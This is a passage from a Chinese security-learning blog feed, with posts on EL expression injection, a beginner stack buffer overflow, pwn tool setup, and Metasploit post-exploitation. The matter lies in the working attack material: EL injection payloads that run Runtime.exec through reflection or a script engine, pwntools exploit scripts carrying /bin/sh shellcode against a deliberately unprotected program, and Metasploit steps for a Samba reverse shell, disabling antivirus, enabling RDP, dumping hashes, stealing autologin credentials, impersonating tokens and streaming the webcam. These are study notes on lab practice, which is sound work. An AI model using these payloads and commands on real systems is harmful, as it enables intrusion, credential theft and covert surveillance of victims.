请求范围内，使用requestScope。</li><li>session，会话范围内，使用sessionScope</li><li>application, 应用范围内，使用applicationScope</li></ul><h2 id="获取隐式对象"><a href="#获取隐式对象" class="headerlink" title="获取隐式对象"></a>获取隐式对象</h2><p>pageContext, JSP页面的上下文，可以用于访问隐式变量（以下），如<code>${pageContext.response}</code>为页面的响应对象赋值，<code>${pageContext.request.queryString}</code>，返回请求的参数和值，即：name=xxx。</p><ul><li>param，请求参数，单个，<code>${param.name}</code>, 返回请求参数name的值</li><li>paramValues，请求参数，数值数组。<code>${paramValues.name}</code>，返回字符串数组</li><li>header，头部，单个，<code>${header.name}</code></li><li>headerValues，头部，数值数组,${headerValues.name}`</li><li>cookie，单个cookie对象,  <code>${cookie.name.value}</code>, 如果是多个同名的cookie，用：<code>${headerValues.name}</code></li><li>initParam，将上下文初始化参数名称映射到单个值。</li></ul><p><strong>注意：有些变量不能用.访问，必须用[], 如：${header[“user-Agent”]}</strong></p><h2 id="调用JAVA方法"><a href="#调用JAVA方法" class="headerlink" title="调用JAVA方法"></a>调用JAVA方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public class ELFunc &#123;</span><br><span class="line">    public static String doSomething(String str)&#123;</span><br><span class="line">        return str + &quot;.com&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建一个类ELFunc, 其中有一个doSomething方法。这个类和方法必须在WEB-INF下新建一个test.tld文件中指定。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;taglib version&#x3D;&quot;2.0&quot; xmlns&#x3D;&quot;http:&#x2F;&#x2F;java.sun.com&#x2F;xml&#x2F;ns&#x2F;j2ee&quot;</span><br><span class="line">    xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">    xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;java.sun.com&#x2F;xml&#x2F;ns&#x2F;j2ee http:&#x2F;&#x2F;java.sun.com&#x2F;xml&#x2F;ns&#x2F;j2ee&#x2F;web-jsptaglibrary_2_0.xsd&quot;&gt;</span><br><span class="line">    &lt;tlib-version&gt;1.0&lt;&#x2F;tlib-version&gt;</span><br><span class="line">    &lt;short-name&gt;ELFunc&lt;&#x2F;short-name&gt;</span><br><span class="line">    &lt;uri&gt;http:&#x2F;&#x2F;www.mi1k7ea.com&#x2F;ELFunc&lt;&#x2F;uri&gt;</span><br><span class="line">    &lt;function&gt;</span><br><span class="line">        &lt;name&gt;doSomething&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;function-class&gt;eltest.ELFunc&lt;&#x2F;function-class&gt;</span><br><span class="line">        &lt;function-signature&gt; java.lang.String doSomething(java.lang.String)&lt;&#x2F;function-signature&gt;</span><br><span class="line">    &lt;&#x2F;function&gt;</span><br><span class="line">&lt;&#x2F;taglib&gt;</span><br></pre></td></tr></table></figure><p>然后在JSP文件中，先头部导入taglib标签库，URI为test.tld中设置的URI地址，prefix为test.tld中设置的short-name，然后直接在EL表达式中使用<code>类名:方法名()</code>的形式来调用该类方法即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@taglib uri&#x3D;&quot;http:&#x2F;&#x2F;www.mi1k7ea.com&#x2F;ELFunc&quot; prefix&#x3D;&quot;ELFunc&quot;%&gt;</span><br><span class="line">$&#123;ELFunc:doSomething(&quot;mi1k7ea&quot;)&#125;</span><br></pre></td></tr></table></figure><h1 id="启动或禁用EL表达式"><a href="#启动或禁用EL表达式" class="headerlink" title="启动或禁用EL表达式"></a>启动或禁用EL表达式</h1><h2 id="全局禁用"><a href="#全局禁用" class="headerlink" title="全局禁用"></a>全局禁用</h2><p>打开web.xml文件，进行如下配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp-config&gt;</span><br><span class="line">&lt;jsp-property-group&gt;</span><br><span class="line">&lt;url-pattern&gt;*.jsp&lt;&#x2F;url-pattern&gt;</span><br><span class="line">&lt;el-ignored&gt;true&lt;&#x2F;el-ignored&gt;</span><br><span class="line">&lt;&#x2F;jsp-property-group&gt;</span><br><span class="line">&lt;&#x2F;jsp-config&gt;</span><br></pre></td></tr></table></figure><p>el-ignored标签中的值设置为true即禁用，false即启用。</p><h2 id="局部禁用"><a href="#局部禁用" class="headerlink" title="局部禁用"></a>局部禁用</h2><p>对于单个JSP文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page isELIgnored&#x3D;&quot;true&quot; %&gt;</span><br></pre></td></tr></table></figure><h1 id="EL表达式注入漏洞"><a href="#EL表达式注入漏洞" class="headerlink" title="EL表达式注入漏洞"></a>EL表达式注入漏洞</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>使用表达式，提供外部接口，并且对外部输入没有进行严格过滤，导致攻击者可以输入恶意表达式从而执行。</p><h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><p>使用运算：</p><p><code>http://xxx.com/xx.jsp?user=${2-1}</code></p><p>返回1，便是执行了减法运算。然后搜索页面HTML代码看这个1在哪输出了。</p><p>使用POC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）</span><br><span class="line">$&#123;pageContext&#125;</span><br><span class="line">&#x2F;&#x2F;获取Web路径</span><br><span class="line">$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(&quot;&quot;)&#125;</span><br><span class="line">&#x2F;&#x2F;文件头参数</span><br><span class="line">$&#123;header&#125;</span><br><span class="line">&#x2F;&#x2F;获取webRoot</span><br><span class="line">$&#123;applicationScope&#125;</span><br><span class="line">&#x2F;&#x2F;执行命令</span><br><span class="line">$&#123;pageContext.request.getSession().setAttribute(&quot;a&quot;,pageContext.request.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc&quot;).getInputStream())&#125;</span><br><span class="line">&#x2F;&#x2F;任意代码执行</span><br><span class="line">$&#123;pageContext.setAttribute(&quot;a&quot;,&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,&quot;&quot;.getClass()).invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(null),&quot;calc.exe&quot;))&#125;</span><br></pre></td></tr></table></figure><h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><h2 id="CVE-2011-2730"><a href="#CVE-2011-2730" class="headerlink" title="CVE-2011-2730"></a>CVE-2011-2730</h2><h2 id="乌云上的漏洞案例"><a href="#乌云上的漏洞案例" class="headerlink" title="乌云上的漏洞案例"></a>乌云上的漏洞案例</h2><p><a href="https://www.secshi.com/goto/wqmz" target="_blank" rel="noopener">https://www.secshi.com/goto/wqmz</a></p><p><a href="https://www.secshi.com/goto/q1hy" target="_blank" rel="noopener">https://www.secshi.com/goto/q1hy</a></p><h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><h2 id="利用反射机制"><a href="#利用反射机制" class="headerlink" title="利用反射机制"></a>利用反射机制</h2><p>即前面的POC</p><h2 id="利用ScriptEngine调用JS引擎"><a href="#利用ScriptEngine调用JS引擎" class="headerlink" title="利用ScriptEngine调用JS引擎"></a>利用ScriptEngine调用JS引擎</h2><p>同SpELl注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;&#39;&#39;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(&#39;calc&#39;)&quot;)&#125;</span><br></pre></td></tr></table></figure><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ul><li><p>不使用外部输入作为表达式内容</p></li><li><p>严格过滤输入</p></li><li><p>对源代码排查</p><p>EL部分的内容在javax.el包中，这个包在JUEL相关包中，源代码直接搜索：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javax.el.ExpressionFactory.createValueExpression()</span><br><span class="line">javax.el.ValueExpression.getValue()</span><br></pre></td></tr></table></figure></li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/7692" target="_blank" rel="noopener">https://xz.aliyun.com/t/7692</a></p><p><a href="https://www.cnblogs.com/xdp-gacl/p/3938361.html" target="_blank" rel="noopener">https://www.cnblogs.com/xdp-gacl/p/3938361.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;好久没更新博客了，今天有空来学习一下EL表达式注入。&lt;/p&gt;
&lt;h1 id=&quot;EL概述&quot;&gt;&lt;a href=&quot;#EL概述&quot; class=&quot;headerlink&quot; title=&quot;EL概述&quot;&gt;&lt;/a&gt;EL概述&lt;/h1&gt;&lt;p&gt;EL是一种语言，为了简化JSP的写法。它的功能有四个：&lt;
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="表达式注入--EL表达式" scheme="https://ggyggy666.github.io/tags/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-EL%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>pwn入门-最简单的溢出</title>
    <link href="https://ggyggy666.github.io/2020/11/07/pwn%E5%85%A5%E9%97%A8-%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E6%BA%A2%E5%87%BA/"/>
    <id>https://ggyggy666.github.io/2020/11/07/pwn%E5%85%A5%E9%97%A8-%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E6%BA%A2%E5%87%BA/</id>
    <published>2020-11-07T12:55:45.000Z</published>
    <updated>2020-11-08T12:53:11.781Z</updated>
    
    <content type="html"><![CDATA[<p>折腾许久，终于完成了第一次最简单的溢出。教程按照：<a href="https://www.yuque.com/hxfqg9/bin/zzg02e" target="_blank" rel="noopener">https://www.yuque.com/hxfqg9/bin/zzg02e</a> ，但是由于没有pattern.py, 使用的是cyclic，因此有点差异。</p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">void vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">char buf[128];</span><br><span class="line">read(STDIN_FILENO, buf, 256);</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char** argv)</span><br><span class="line">&#123;</span><br><span class="line">vulnerable_function();</span><br><span class="line">write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保存为level1.c后</p><h2 id="关闭NX、DEP、ASLR"><a href="#关闭NX、DEP、ASLR" class="headerlink" title="关闭NX、DEP、ASLR"></a>关闭NX、DEP、ASLR</h2><p>编译:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -no-pie -fno-stack-protector -z execstack -o level1 level1.c</span><br></pre></td></tr></table></figure><ul><li>-m32表示编译32位的程序</li><li>-fno-stack-protector 表示关掉堆栈保护</li><li>-z execstack 表示数据所在页不可执行</li><li>-no-pie 表示关闭PIE</li></ul><p>还需要关掉ASLR</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</span><br></pre></td></tr></table></figure><p>使用checksec检查保护机制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec level1</span><br></pre></td></tr></table></figure><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>首先在任意目录下，输入命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyclic 150&#x2F;&#x2F;没有pattern.py,直接使用cyclic 150生成150个字母</span><br></pre></td></tr></table></figure><p>然后gdb进行调试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb .&#x2F;level1</span><br><span class="line">r</span><br></pre></td></tr></table></figure><p>然后将上面的150个字符复制作为输入</p><p>执行完发现报错了，得到一个地址：0x6261616b ，这个就是函数返回地址，因为输入的数据太多了导致覆盖了函数返回地址从而出错。</p><p>接着根据这个返回地址计算出缓冲区内的分配的数据空间大小：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyclic -l 0x6261616b</span><br></pre></td></tr></table></figure><p>得到140，说明分配的数据空间大小是140个字符。现在我们来看一下堆栈结构：</p><p><img src="https://pic.downk.cc/item/5fa69d0d1cd1bbb86bf3b32e.jpg" alt></p><p>可以知道，返回地址上面还有一个EBP，4个字节，再上面才是数据空间。</p><p>因此如果我们将函数返回地址覆盖成shellcode所在的起始地址，就可以执行shellcode了。</p><p><strong>注意：</strong>还有一个问题，虽然关闭了ASLR，但是我们上面测试看到的地址只是在gdb环境下调试得到的，真实的地址会是其它位置 ，因此需要开启core dump:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ulimit -c unlimited&#x2F;&#x2F;开启内存错误转储</span><br><span class="line">cyclic 150  &#x2F;&#x2F;得到150个字符</span><br><span class="line">.&#x2F;level1</span><br><span class="line">输入150个字符，报错</span><br><span class="line">ls&#x2F;&#x2F;即可看到core</span><br></pre></td></tr></table></figure><p>生成一个core文件在当前目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb level1 core</span><br></pre></td></tr></table></figure><p>进入gdb后，查看shellcode应该放入的地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x&#x2F;10s $esp-144</span><br></pre></td></tr></table></figure><p>关于为什么是144，上面图也可以看出来了，还有一个EBP的存在。140+4</p><p>从而得到shellcode的地址是：0xffffd000</p><p>可以写脚本了</p><h2 id="exp脚本"><a href="#exp脚本" class="headerlink" title="exp脚本"></a>exp脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;level1&#39;)&#x2F;&#x2F;脚本与level1在同一目录下</span><br><span class="line">ret &#x3D; 0xffffd000</span><br><span class="line">shellcode &#x3D; asm(shellcraft.sh())</span><br><span class="line">payload &#x3D; shellcode.ljust(140,&#39;a&#39;) + p32(ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这个是用shellcraft.sh()自动生成的shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;level1&#39;)</span><br><span class="line">ret &#x3D; 0xffffd000</span><br><span class="line">shellcode &#x3D; &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span><br><span class="line">shellcode +&#x3D; &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span><br><span class="line">shellcode +&#x3D; &quot;\x0b\xcd\x80&quot;</span><br><span class="line">payload &#x3D; shellcode + &#39;A&#39; * (140 - len(shellcode)) + p32(ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这个是自己编写的shellcode。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py</span><br></pre></td></tr></table></figure><p>即可看到执行成功了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;折腾许久，终于完成了第一次最简单的溢出。教程按照：&lt;a href=&quot;https://www.yuque.com/hxfqg9/bin/zzg02e&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.yuque.com/hxfqg9/bi
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://ggyggy666.github.io/categories/pwn/"/>
    
    
      <category term="pwn入门-最简单的溢出" scheme="https://ggyggy666.github.io/tags/pwn%E5%85%A5%E9%97%A8-%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>pwn入门-环境安装</title>
    <link href="https://ggyggy666.github.io/2020/11/06/pwn%E5%85%A5%E9%97%A8-%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/"/>
    <id>https://ggyggy666.github.io/2020/11/06/pwn%E5%85%A5%E9%97%A8-%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/</id>
    <published>2020-11-06T14:55:25.000Z</published>
    <updated>2020-11-08T12:53:06.306Z</updated>
    
    <content type="html"><![CDATA[<p>今天学习pwn</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>Ubuntu系统</p><p>pwntools</p><p>pwndbg</p><p>IDA</p><p>ipython</p><p>gcc-multilib</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-pip</span><br><span class="line">sudo apt-get install python3-pip</span><br><span class="line"></span><br><span class="line">cd ~</span><br><span class="line">mkdir .pip &amp; cd .pip</span><br><span class="line">vim pip.conf</span><br><span class="line">[global]</span><br><span class="line">index-url &#x3D; https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple</span><br><span class="line"></span><br><span class="line">pip install pwntools</span><br><span class="line"></span><br><span class="line">git clone https:&#x2F;&#x2F;gitee.com&#x2F;ggy666&#x2F;GDB-Plugins.git</span><br><span class="line">cd GDB-Plugins&#x2F;pwndbg</span><br><span class="line">git init</span><br><span class="line">chmod 777 .&#x2F;setup.sh</span><br><span class="line">.&#x2F;setup.sh(ubuntu18可以，ubuntu20一直报错)</span><br><span class="line"></span><br><span class="line">apt-get install gcc-multilib</span><br></pre></td></tr></table></figure><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>pwntools:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd pwntools</span><br><span class="line">pip install -r requirement.txt</span><br><span class="line">python setup.py(root下执行)</span><br></pre></td></tr></table></figure><p>pwndbg:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd pwndbg</span><br><span class="line">.&#x2F;setup.sh</span><br></pre></td></tr></table></figure><p>IDA:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">解压IDA到任意目录，然后</span><br><span class="line">sudo apt-get install libstdc++5:i386</span><br><span class="line">cd IDA</span><br><span class="line">.&#x2F;idaq  即可运行</span><br></pre></td></tr></table></figure><p>其它可参考下面链接的配置</p><p>主要参考：<a href="https://www.yuque.com/hxfqg9/bin/zzg02e" target="_blank" rel="noopener">https://www.yuque.com/hxfqg9/bin/zzg02e</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天学习pwn&lt;/p&gt;
&lt;h2 id=&quot;环境准备&quot;&gt;&lt;a href=&quot;#环境准备&quot; class=&quot;headerlink&quot; title=&quot;环境准备&quot;&gt;&lt;/a&gt;环境准备&lt;/h2&gt;&lt;p&gt;Ubuntu系统&lt;/p&gt;
&lt;p&gt;pwntools&lt;/p&gt;
&lt;p&gt;pwndbg&lt;/p&gt;
&lt;p&gt;I
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://ggyggy666.github.io/categories/pwn/"/>
    
    
      <category term="pwn入门-环境安装" scheme="https://ggyggy666.github.io/tags/pwn%E5%85%A5%E9%97%A8-%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/"/>
    
  </entry>
  
  <entry>
    <title>msf后渗透过程</title>
    <link href="https://ggyggy666.github.io/2020/09/30/msf%E5%90%8E%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/"/>
    <id>https://ggyggy666.github.io/2020/09/30/msf%E5%90%8E%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/</id>
    <published>2020-09-30T12:25:05.000Z</published>
    <updated>2020-09-30T13:11:03.702Z</updated>
    
    <content type="html"><![CDATA[<p>最近学习后渗透和内网渗透，在此理清一下思路。</p><h2 id="msf模块"><a href="#msf模块" class="headerlink" title="msf模块"></a>msf模块</h2><ul><li>Auxiliaries, 辅助模块，用于扫描主机、端口、嗅探和指纹识别等信息收集。</li><li>Exploit，漏洞利用模块，针对一个存在的漏洞发起攻击的一段代码。</li><li>payload，攻击载荷模块，用于目标系统被渗透攻击之后运行的代码。</li><li>POST，后期渗透模块，渗透进内网后需要进行攻击所利用到的代码。</li><li>Encoders, 编码模块，用于免杀。</li></ul><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>可以直接利用db_nmap, 使用nmap的方式进行扫描。或者使用辅助模块。</p><ul><li><p>端口扫描：</p><p><code>search portscan</code></p><p><code>use auxiliary/scanner/portscan/tcp</code></p><p>使用TCP扫描</p><p><code>show options</code> -&gt; <code>set rhosts 主机地址</code> —&gt; <code>set ports 1-500</code> -&gt; run</p></li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用信息收集方式得到目标主机运行的服务后，尝试用exploit去攻击。比如知道了目标运行Samba服务，那么可以查找相应代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">search samba</span><br><span class="line">use exploit&#x2F;multi&#x2F;samba&#x2F;usermap_script</span><br><span class="line">set payload cmd&#x2F;unix&#x2F;reverse&#x2F;&#x2F;设置payload</span><br><span class="line">set rhost xx</span><br><span class="line">set port 445</span><br><span class="line">set lhost 本地地址</span><br><span class="line">exploit 或者 run</span><br></pre></td></tr></table></figure><h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><h3 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h3><p><code>ps</code></p><p>获取目标主机运行的进程</p><p><code>getpid</code></p><p>获得当前渗透进目标的shell的进程号</p><p><code>migrate xx</code></p><p>找到一个进程号，迁移进去即可。</p><h3 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h3><p><code>sysinfo</code></p><p>查看系统信息</p><p><code>run post/windows/gather/checkvm</code></p><p>检测目标是否是虚拟机</p><p><code>idletime</code></p><p>检测目标运行时间</p><p><code>route</code></p><p>查看网络路由</p><p><code>getuid</code></p><p>查看当前登录的用户</p><p><code>run post/windows/manage/killav</code></p><p>关闭目标的杀毒软件</p><p><code>run post/windows/manage/enable_rdp</code></p><p>启动目标的远程桌面协议，之后打开另一个命令行，使用<code>rdesktop 目标地址</code>进行远程桌面连接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;autoroute</span><br><span class="line">background</span><br><span class="line">route add xx.xx.xx.xx 255.255.255.0 1</span><br><span class="line">route print</span><br></pre></td></tr></table></figure><p>添加一条路由</p><p><code>run post/windows/gather/enum_logged_on_users</code></p><p>列举当前有多少用户登录</p><p><code>run post/windows/gather/enum_applications</code></p><p>列举安装的应用程序</p><p><code>run windows/gather/credentials/windows_autologin</code></p><p>抓取自动登录的用户名和密码</p><p><code>screenshot</code></p><p>截图</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">webcam_list  &#x2F;&#x2F;查看有无摄像头</span><br><span class="line">webcam_snap&#x2F;&#x2F;打开摄像头</span><br><span class="line">webcam_stream&#x2F;&#x2F;开启直播</span><br></pre></td></tr></table></figure><p><code>shell</code></p><p>进入命令行</p><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><p><code>pwd</code></p><p>查看目标当前目录</p><p><code>getlwd</code></p><p>查看本机当前目录</p><p><code>ls</code></p><p>列出本机当前目录下的所有文件</p><p><code>search -f *.txt -d c:\\</code></p><p>搜索C盘下所有以TXT结尾的文件</p><p><code>download c:\\test.txt /root</code></p><p>下载目标的test.txt到本机的root目录下</p><p><code>upload /root/test.txt c:\\</code></p><p>将本机的test.txt上传到目标的C盘下。</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell  进入命令行</span><br><span class="line">whoami &#x2F;groups查看当前权限</span><br></pre></td></tr></table></figure><h4 id="利用溢出漏洞"><a href="#利用溢出漏洞" class="headerlink" title="利用溢出漏洞"></a>利用溢出漏洞</h4><p><code>getuid</code></p><p>查看当前用户</p><p>shell进入后，命令行中输入：</p><p><code>systeminfo</code></p><p>查看系统信息，查找目标打的补丁，然后在Exploit-DB和安全焦点上查找目标没有打的补丁，然后找到相应漏洞名称，search它，之后利用攻击即可。</p><h4 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h4><p>kerberos协议。假冒令牌。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br><span class="line">getsystem</span><br><span class="line">use incognito</span><br><span class="line">list_token -u</span><br><span class="line">查找到可利用的令牌即登录的用户名称</span><br><span class="line">impersonate_token WIN-57\\Administrator</span><br></pre></td></tr></table></figure><h3 id="抓取密码"><a href="#抓取密码" class="headerlink" title="抓取密码"></a>抓取密码</h3><p><code>hashdump</code></p><p>注意需要系统权限。</p><p><code>run windows/gather/smart_hashdump</code></p><p>绕过开启了UAC的Windows7.</p><p>或者使用mimikatz（system权限）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td 